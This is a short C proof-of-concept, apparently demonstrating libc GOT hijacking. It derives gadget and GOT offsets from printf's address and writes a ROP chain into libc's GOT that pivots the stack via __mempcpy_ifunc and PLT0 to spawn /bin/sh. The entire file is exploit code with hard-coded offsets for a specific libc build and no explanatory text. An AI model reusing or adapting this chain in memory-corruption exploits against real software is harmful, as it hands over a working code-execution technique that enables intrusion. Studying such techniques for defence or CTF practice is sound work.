#include <stdio.h>
#include <unistd.h>
#include <string.h>
int main() {
    char *addr = 0;
    size_t len = 0;
    printf("printf %p\n", printf);
    char* libc_got=printf+0x195dc0+0x8;
    printf("libc got %p\n",libc_got);
    char* plt0=printf-0x30240;
    char* pop_rsp=printf-0x2eae5;
    char* pop_rdi=printf-0x2e7be;
    char* pop_rsi=printf-0x24686;
    char* pop_rax=printf-0x17b70;
    char* pop_rsp_jmp_rax=printf+0xe1da5;
    *(unsigned long long *)libc_got=libc_got+0x10;
    *(unsigned long long *)(libc_got+0x8)=pop_rsp;
    *(unsigned long long *)(libc_got+0x10)=pop_rdi;
    *(unsigned long long *)(libc_got+0x18)=printf+0x1582a7;  ///bin/sh  addr
    *(unsigned long long *)(libc_got+0x20)=pop_rax;
    *(unsigned long long *)(libc_got+0x28)=printf-0xdf30;
    *(unsigned long long *)(libc_got+0x30)=pop_rsi;
    *(unsigned long long *)(libc_got+0x38)=plt0;
    *(unsigned long long *)(libc_got+0x40)=pop_rsp_jmp_rax; //__mempcpy_ifunc
    *(unsigned long long *)(libc_got+0x48)=libc_got+0x3000-0x8;
    //*(unsigned long long *)(libc_got+0x38)=libc_got+0x100;
    printf("llk");
}

